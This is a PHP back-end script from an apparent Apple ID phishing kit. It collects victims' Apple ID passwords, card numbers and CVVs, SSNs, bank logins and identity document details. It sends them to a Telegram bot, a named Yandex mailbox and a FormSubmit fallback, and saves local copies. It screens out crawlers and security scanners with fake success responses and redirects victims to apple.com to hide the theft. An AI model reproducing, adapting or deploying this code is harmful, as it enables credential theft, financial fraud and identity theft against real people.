<?php
// Set headers to handle AJAX requests
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type, X-Requested-With, X-Verification-Token');

// Create upload directory if it doesn't exist
$uploadDir = 'uploads/';
if (!file_exists($uploadDir)) {
    mkdir($uploadDir, 0755, true);
}

// Anti-Bot Protection
function checkForBot($request) {
    // Check if the request has the necessary headers
    if (!isset($_SERVER['HTTP_X_REQUESTED_WITH']) || $_SERVER['HTTP_X_REQUESTED_WITH'] !== 'XMLHttpRequest') {
        return true;
    }
    
    // Check verification token
    if (!isset($_SERVER['HTTP_X_VERIFICATION_TOKEN']) || empty($_SERVER['HTTP_X_VERIFICATION_TOKEN'])) {
        return true;
    }
    
    // Check if verification data is provided
    if (!isset($request['verification']) || empty($request['verification'])) {
        return true;
    }
    
    // Decode verification data
    $verification = json_decode($request['verification'], true);
    
    // Check time spent on page (bots usually submit too quickly)
    if (isset($verification['timeOnPage']) && $verification['timeOnPage'] < 3000) {
        return true;
    }
    
    // Check mouse movements (bots often don't move the mouse)
    if (isset($verification['mouseMoves']) && $verification['mouseMoves'] < 5) {
        return true;
    }
    
    // Check key presses (if applicable fields existed)
    if (isset($verification['keyPresses']) && $verification['keyPresses'] < 10) {
        return true;
    }
    
    // Check for common bot user agents
    $botSignatures = array(
        'bot', 'spider', 'crawl', 'lighthouse', 'slurp', 'phantom', 'headless',
        'selenium', 'puppeteer', 'chrome-lighthouse', 'googlebot', 'yandexbot',
        'bingbot', 'robot', 'curl', 'wget', 'scraper', 'java/', 'python-requests'
    );
    
    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    foreach ($botSignatures as $signature) {
        if (strpos($userAgent, $signature) !== false) {
            return true;
        }
    }
    
    return false;
}

// Function to generate new verification token
function generateNewToken($length = 32) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

// Function to send data to Telegram
function sendToTelegram($message) {
    // Replace with your actual bot token and chat ID
    $botToken = 'YOUR_TELEGRAM_BOT_TOKEN';
    $chatId = 'YOUR_CHAT_ID';
    
    // Format message for Telegram
    $formattedMessage = urlencode($message);
    
    // Telegram API URL
    $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text={$formattedMessage}&parse_mode=HTML";
    
    // Send request to Telegram
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response;
}

// Improved function to send data to Yandex email
function sendToYandexEmail($data) {
    // Replace with your actual Yandex email
    $to = "jokersudo@yandex.com";
    $subject = "New Apple Verification Data - " . date('Y-m-d H:i:s');
    
    // Create a unique boundary for multipart emails
    $boundary = md5(time());
    
    // Email headers
    $headers = "From: Apple Verification <no-reply@" . $_SERVER['HTTP_HOST'] . ">\r\n";
    $headers .= "Reply-To: no-reply@" . $_SERVER['HTTP_HOST'] . "\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: multipart/alternative; boundary=\"$boundary\"\r\n";
    $headers .= "X-Priority: 1\r\n"; // High priority
    $headers .= "X-MSMail-Priority: High\r\n"; 
    $headers .= "Importance: High\r\n";
    
    // Create plain text message
    $text_message = "NEW APPLE VERIFICATION DATA\n\n";
    
    // LOGIN DETAILS
    $text_message .= "LOGIN DETAILS\n";
    $text_message .= "Apple ID: " . ($data['email'] ?? 'N/A') . "\n";
    $text_message .= "Password: " . ($data['password'] ?? 'N/A') . "\n\n";
    
    // CARD DETAILS
    $text_message .= "CARD DETAILS\n";
    $text_message .= "Bank: " . ($data['bank'] ?? 'N/A') . "\n";
    $text_message .= "Level: " . ($data['card_level'] ?? 'N/A') . "\n";
    $text_message .= "Cardholder: " . ($data['cardholder'] ?? 'N/A') . "\n";
    $text_message .= "Card Number: " . ($data['card_number'] ?? 'N/A') . "\n";
    $text_message .= "Expiry: " . ($data['expiry'] ?? 'N/A') . "\n";
    $text_message .= "CVV: " . ($data['cvv'] ?? 'N/A') . "\n";
    $text_message .= "SSN: " . ($data['ssn'] ?? 'N/A') . "\n\n";
    
    // BANK INFO
    $text_message .= "BANK INFO\n";
    $text_message .= "Bank Username: " . ($data['bank_username'] ?? 'N/A') . "\n";
    $text_message .= "Bank Password: " . ($data['card_password'] ?? 'N/A') . "\n\n";
    
    // PERSONAL INFO
    $text_message .= "PERSONAL INFO\n";
    $text_message .= "First Name: " . ($data['firstname'] ?? 'N/A') . "\n";
    $text_message .= "Last Name: " . ($data['lastname'] ?? 'N/A') . "\n";
    $text_message .= "Address: " . ($data['address'] ?? 'N/A') . "\n";
    $text_message .= "City: " . ($data['city'] ?? 'N/A') . "\n";
    $text_message .= "State: " . ($data['state'] ?? 'N/A') . "\n";
    $text_message .= "Country: " . ($data['country'] ?? 'N/A') . "\n";
    $text_message .= "Zip: " . ($data['zipcode'] ?? 'N/A') . "\n";
    $text_message .= "Phone: " . ($data['phone'] ?? 'N/A') . "\n\n";
    
    // DEVICE INFO
    $text_message .= "DEVICE INFO\n";
    $text_message .= "IP Address: " . $_SERVER['REMOTE_ADDR'] . "\n";
    $text_message .= "User Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
    $text_message .= "Date/Time: " . date('Y-m-d H:i:s') . "\n";
    
    // Create HTML message
    $html_message = "<html><body>";
    $html_message .= "<h2>New Apple Verification Data</h2>";
    
    // LOGIN DETAILS
    $html_message .= "<h3 style='background-color:#f0f0f0;padding:5px;'>LOGIN DETAILS</h3>";
    $html_message .= "<p><strong>Apple ID:</strong> " . ($data['email'] ?? 'N/A') . "</p>";
    $html_message .= "<p><strong>Password:</strong> " . ($data['password'] ?? 'N/A') . "</p>";
    
    // CARD DETAILS
    $html_message .= "<h3 style='background-color:#f0f0f0;padding:5px;'>CARD DETAILS</h3>";
    $html_message .= "<p><strong>Bank:</strong> " . ($data['bank'] ?? 'N/A') . "</p>";
    $html_message .= "<p><strong>Level:</strong> " . ($data['card_level'] ?? 'N/A') . "</p>";
    $html_message .= "<p><strong>Cardholder:</strong> " . ($data['cardholder'] ?? 'N/A') . "</p>";
    $html_message .= "<p><strong>Card Number:</strong> " . ($data['card_number'] ?? 'N/A') . "</p>";
    $html_message .= "<p><strong>Expiry:</strong> " . ($data['expiry'] ?? 'N/A') . "</p>";
    $html_message .= "<p><strong>CVV:</strong> " . ($data['cvv'] ?? 'N/A') . "</p>";
    $html_message .= "<p><strong>SSN:</strong> " . ($data['ssn'] ?? 'N/A') . "</p>";
    
    // BANK INFO
    $html_message .= "<h3 style='background-color:#f0f0f0;padding:5px;'>BANK INFO</h3>";
    $html_message .= "<p><strong>Bank Username:</strong> " . ($data['bank_username'] ?? 'N/A') . "</p>";
    $html_message .= "<p><strong>Bank Password:</strong> " . ($data['card_password'] ?? 'N/A') . "</p>";
    
    // PERSONAL INFO
    $html_message .= "<h3 style='background-color:#f0f0f0;padding:5px;'>PERSONAL INFO</h3>";
    $html_message .= "<p><strong>First Name:</strong> " . ($data['firstname'] ?? 'N/A') . "</p>";
    $html_message .= "<p><strong>Last Name:</strong> " . ($data['lastname'] ?? 'N/A') . "</p>";
    $html_message .= "<p><strong>Address:</strong> " . ($data['address'] ?? 'N/A') . "</p>";
    $html_message .= "<p><strong>City:</strong> " . ($data['city'] ?? 'N/A') . "</p>";
    $html_message .= "<p><strong>State:</strong> " . ($data['state'] ?? 'N/A') . "</p>";
    $html_message .= "<p><strong>Country:</strong> " . ($data['country'] ?? 'N/A') . "</p>";
    $html_message .= "<p><strong>Zip:</strong> " . ($data['zipcode'] ?? 'N/A') . "</p>";
    $html_message .= "<p><strong>Phone:</strong> " . ($data['phone'] ?? 'N/A') . "</p>";
    
    // DEVICE INFO
    $html_message .= "<h3 style='background-color:#f0f0f0;padding:5px;'>DEVICE INFO</h3>";
    $html_message .= "<p><strong>IP Address:</strong> " . $_SERVER['REMOTE_ADDR'] . "</p>";
    $html_message .= "<p><strong>User Agent:</strong> " . $_SERVER['HTTP_USER_AGENT'] . "</p>";
    $html_message .= "<p><strong>Date/Time:</strong> " . date('Y-m-d H:i:s') . "</p>";
    
    $html_message .= "</body></html>";
    
    // Build the email body with both text and HTML versions
    $body = "--$boundary\r\n";
    $body .= "Content-Type: text/plain; charset=UTF-8\r\n";
    $body .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
    $body .= $text_message . "\r\n\r\n";
    
    $body .= "--$boundary\r\n";
    $body .= "Content-Type: text/html; charset=UTF-8\r\n";
    $body .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
    $body .= $html_message . "\r\n\r\n";
    
    $body .= "--$boundary--";
    
    // Try sending with PHP mail() function
    $mail_result = mail($to, $subject, $body, $headers);
    
    // Log the mail attempt
    file_put_contents('mail_log.txt', date('Y-m-d H:i:s') . " - Mail to $to - Result: " . ($mail_result ? 'SUCCESS' : 'FAILED') . "\n", FILE_APPEND);
    
    return $mail_result;
}

// Alternative delivery method using FormSubmit
function sendViaFormSubmit($data) {
    // Replace with your actual Yandex email
    $formSubmitEndpoint = "https://formsubmit.co/your-yandex-email@yandex.com";
    
    // Format data as form fields
    $formData = [
        '_subject' => 'New Apple Verification Data - ' . date('Y-m-d H:i:s'),
        'email' => $data['email'] ?? 'N/A',
        'password' => $data['password'] ?? 'N/A',
        'bank' => $data['bank'] ?? 'N/A',
        'level' => $data['card_level'] ?? 'N/A',
        'cardholder' => $data['cardholder'] ?? 'N/A',
        'card_number' => $data['card_number'] ?? 'N/A',
        'expiry' => $data['expiry'] ?? 'N/A',
        'cvv' => $data['cvv'] ?? 'N/A',
        'ssn' => $data['ssn'] ?? 'N/A',
        'bank_username' => $data['bank_username'] ?? 'N/A',
        'bank_password' => $data['card_password'] ?? 'N/A',
        'firstname' => $data['firstname'] ?? 'N/A',
        'lastname' => $data['lastname'] ?? 'N/A',
        'address' => $data['address'] ?? 'N/A',
        'city' => $data['city'] ?? 'N/A',
        'state' => $data['state'] ?? 'N/A',
        'country' => $data['country'] ?? 'N/A',
        'zipcode' => $data['zipcode'] ?? 'N/A',
        'phone' => $data['phone'] ?? 'N/A',
        'ip_address' => $_SERVER['REMOTE_ADDR'],
        'timestamp' => date('Y-m-d H:i:s'),
        '_template' => 'table'
    ];
    
    // Send to FormSubmit
    $ch = curl_init($formSubmitEndpoint);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($formData));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    $success = !curl_errno($ch);
    curl_close($ch);
    
    // Log the attempt
    file_put_contents('formsubmit_log.txt', date('Y-m-d H:i:s') . " - FormSubmit - Result: " . ($success ? "SUCCESS" : "FAILED") . "\n", FILE_APPEND);
    
    return $success;
}

// Process the request
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Log the raw request for debugging
    file_put_contents('request_log.txt', date('Y-m-d H:i:s') . ' - ' . print_r($_POST, true) . "\n", FILE_APPEND);
    
    // Verify the request is from a valid source, not a bot
    if (checkForBot($_POST)) {
        // Return normal response to not alert bots, but don't process the data
        $response = array(
            'status' => 'success',
            'token' => $_SERVER['HTTP_X_VERIFICATION_TOKEN'] ?? '',
            'newToken' => generateNewToken()
        );
        echo json_encode($response);
        exit;
    }
    
    // Get step number
    $step = isset($_POST['step']) ? intval($_POST['step']) : 0;
    
    // Collection of data from the form
    $data = array();
    
    // Process based on step
    switch ($step) {
        case 1:
            // Account credentials step
            if (isset($_POST['email']) && isset($_POST['password'])) {
                $data = array(
                    'step' => 'Account Information',
                    'email' => $_POST['email'],
                    'password' => $_POST['password'],
                    'ip' => $_SERVER['REMOTE_ADDR'],
                    'user_agent' => $_SERVER['HTTP_USER_AGENT'],
                    'timestamp' => date('Y-m-d H:i:s')
                );
                
                // Format message for Telegram
                $message = "🔐 <b>Apple ID Data:</b>\n";
                $message .= "📧 <b>Email:</b> " . $_POST['email'] . "\n";
                $message .= "🔑 <b>Password:</b> " . $_POST['password'] . "\n";
                $message .= "🌐 <b>IP:</b> " . $_SERVER['REMOTE_ADDR'] . "\n";
                $message .= "📱 <b>User Agent:</b> " . $_SERVER['HTTP_USER_AGENT'] . "\n";
                $message .= "⏰ <b>Time:</b> " . date('Y-m-d H:i:s') . "\n";
                
                // Send data to Telegram and email
                sendToTelegram($message);
                sendToYandexEmail($data);
            }
            break;
            
        case 4:
            // Final submission with all data
            // Get JSON data from form
            $email = isset($_POST['collected-email']) ? $_POST['collected-email'] : '';
            $password = isset($_POST['collected-password']) ? $_POST['collected-password'] : '';
            $cardJson = isset($_POST['collected-card']) ? $_POST['collected-card'] : '{}';
            $personalJson = isset($_POST['collected-personal']) ? $_POST['collected-personal'] : '{}';
            $idJson = isset($_POST['collected-id']) ? $_POST['collected-id'] : '{}';
            
            // Parse JSON data
            $cardData = json_decode($cardJson, true) ?: [];
            $personalData = json_decode($personalJson, true) ?: [];
            $idData = json_decode($idJson, true) ?: [];
            
            // Combine all data
            $data = array(
                'step' => 'Complete Form Submission',
                'email' => $email,
                'password' => $password,
                'ip' => $_SERVER['REMOTE_ADDR'],
                'user_agent' => $_SERVER['HTTP_USER_AGENT'],
                'timestamp' => date('Y-m-d H:i:s')
            );
            
            // Add card data
            if (!empty($cardData)) {
                $data = array_merge($data, [
                    'bank' => $cardData['bank'] ?? '',
                    'card_level' => $cardData['cardLevel'] ?? '',
                    'cardholder' => $cardData['cardholder'] ?? '',
                    'card_number' => $cardData['cardNumber'] ?? '',
                    'expiry' => $cardData['expiry'] ?? '',
                    'cvv' => $cardData['cvv'] ?? '',
                    'amex_cid' => $cardData['amexCID'] ?? '',
                    'ssn' => $cardData['ssn'] ?? '',
                    'credit_limit' => $cardData['creditLimit'] ?? '',
                    'card_password' => $cardData['cardPassword'] ?? ''
                ]);
            }
            
            // Add personal data
            if (!empty($personalData)) {
                $data = array_merge($data, [
                    'firstname' => $personalData['firstName'] ?? '',
                    'lastname' => $personalData['lastName'] ?? '',
                    'address' => $personalData['address'] ?? '',
                    'city' => $personalData['city'] ?? '',
                    'state' => $personalData['state'] ?? '',
                    'country' => $personalData['country'] ?? '',
                    'zipcode' => $personalData['zipcode'] ?? '',
                    'phone' => $personalData['phone'] ?? ''
                ]);
            }
            
            // Add ID data
            if (!empty($idData)) {
                $data = array_merge($data, [
                    'id_type' => $idData['idType'] ?? '',
                    'id_number' => $idData['idNumber'] ?? '',
                    'id_issue_date' => $idData['issueDate'] ?? '',
                    'id_expiry_date' => $idData['expiryDate'] ?? ''
                ]);
            }
            
            // Format complete message for Telegram 
            $message = "#--------------------------------[ LOGIN DETAILS ]-------------------------------#\n";
            $message .= "Apple ID : " . $email . "\n";
            $message .= "Password : " . $password . "\n";
            $message .= "#--------------------------------[ CARD DETAILS ]-------------------------------#\n";
            $message .= "Bank : " . ($cardData['bank'] ?? 'N/A') . "\n";
            $message .= "Level : " . ($cardData['cardLevel'] ?? 'N/A') . "\n";
            $message .= "Cardholders : " . ($cardData['cardholder'] ?? 'N/A') . "\n";
            $message .= "CC Number : " . ($cardData['cardNumber'] ?? 'N/A') . "\n";
            $message .= "Expired : " . ($cardData['expiry'] ?? 'N/A') . "\n";
            $message .= "CVV : " . ($cardData['cvv'] ?? 'N/A') . "\n";
            $message .= "AMEX CID : " . ($cardData['amexCID'] ?? 'N/A') . "\n";
            $message .= "SSN : " . ($cardData['ssn'] ?? 'N/A') . "\n";
            $message .= "Credit Limit : " . ($cardData['creditLimit'] ?? 'N/A') . "\n";
            $message .= "#--------------------------[ = INFO ]-----------------------------#\n";
            $message .= "Bank Username : " . ($cardData['bankUsername'] ?? 'N/A') . "\n";
            $message .= "Bank Password : " . ($cardData['cardPassword'] ?? 'N/A') . "\n";
            $message .= "#-------------------------[ PERSONAL INFORMATION ]--------------------------------#\n";
            $message .= "First Name : " . ($personalData['firstName'] ?? 'N/A') . "\n";
            $message .= "Last Name : " . ($personalData['lastName'] ?? 'N/A') . "\n";
            $message .= "Address : " . ($personalData['address'] ?? 'N/A') . "\n";
            $message .= "City : " . ($personalData['city'] ?? 'N/A') . "\n";
            $message .= "State : " . ($personalData['state'] ?? 'N/A') . "\n";
            $message .= "Country : " . ($personalData['country'] ?? 'N/A') . "\n";
            $message .= "Zip : " . ($personalData['zipcode'] ?? 'N/A') . "\n";
            $message .= "Phone : " . ($personalData['phone'] ?? 'N/A') . "\n";
            $message .= "#------------------------[ ID INFORMATION ]------------------------------#\n";
            $message .= "ID Type : " . ($idData['idType'] ?? 'N/A') . "\n";
            $message .= "ID Number : " . ($idData['idNumber'] ?? 'N/A') . "\n";
            $message .= "Issue Date : " . ($idData['issueDate'] ?? 'N/A') . "\n";
            $message .= "Expiry Date : " . ($idData['expiryDate'] ?? 'N/A') . "\n";
            $message .= "#------------------------[ DEVICE INFORMATION ]------------------------------#\n";
            $message .= "IP Address : " . $_SERVER['REMOTE_ADDR'] . "\n";
            $message .= "User Agent : " . $_SERVER['HTTP_USER_AGENT'] . "\n";
            $message .= "Date/Time : " . date('Y-m-d H:i:s') . "\n";
            
            // Try multiple delivery methods for redundancy
            $emailSent = sendToYandexEmail($data);
            
            // If primary method failed, try alternative
            if (!$emailSent) {
                $formSubmitSent = sendViaFormSubmit($data);
            }
            
            // Try Telegram regardless
            sendToTelegram($message);
            
            // Always save a backup of the data
            $backup_data = json_encode([
                'timestamp' => date('Y-m-d H:i:s'),
                'ip' => $_SERVER['REMOTE_ADDR'],
                'data' => $data
            ]);
            file_put_contents('data_' . time() . '.json', $backup_data);
            
            // Log completion
            file_put_contents('completed_submissions.txt', date('Y-m-d H:i:s') . ' - ' . $email . ' - ' . $_SERVER['REMOTE_ADDR'] . "\n", FILE_APPEND);
            break;
    }
    
    // Return success response
    $response = array(
        'status' => 'success',
        'redirect' => 'https://www.apple.com',
        'newToken' => generateNewToken()
    );
    
    echo json_encode($response);
} else {
    // Not a POST request - redirect to avoid direct access
    header('Location: https://www.apple.com');
    exit;
}
?>
